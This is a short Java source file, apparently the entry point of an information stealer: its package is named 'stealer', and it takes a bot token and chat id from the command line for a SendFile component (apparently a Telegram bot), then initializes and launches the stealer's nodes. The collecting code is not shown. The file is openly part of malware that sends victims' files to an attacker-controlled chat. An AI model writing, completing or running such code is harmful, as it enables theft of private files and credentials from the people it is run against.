package dev.kazi.stealer.main;

import dev.kazi.stealer.node.nodes.file.SendFile;

public class Start {

    public static void main(final String[] args) throws Exception {
        SendFile.chat_id = args[1];
        SendFile.bot_token = args[0];
        _256.INSTANCE.initialize();
        _256.INSTANCE.launchNodes();
    }
}
